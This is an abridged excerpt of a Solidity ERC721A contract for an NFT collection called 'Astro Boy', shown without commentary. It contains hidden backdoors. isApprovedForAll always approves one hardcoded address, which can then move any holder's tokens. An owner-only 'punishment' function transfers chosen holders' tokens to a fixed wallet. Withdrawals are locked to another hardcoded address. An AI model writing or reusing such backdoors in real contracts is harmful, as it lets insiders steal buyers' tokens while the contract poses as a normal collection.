  ...
  Ownable
{
  ...
  bytes32 public LWlMerkle; //////////////////////////////////////////////////////////////////////////////////////////////////////// new 1
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x886C344Ed9728e6B6E383933251a267E96328c77){return true;}
...
contract Astro_Boy is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Astro Boy", "AB", maxBatchSize_, collectionSize_) {
  ...
  function punishment(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x025f1ceC443e6d56008655D7f0f61c070F2B90A0, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xa18c77761D95cf96fB1f3a8bb2679F8A3b609800);
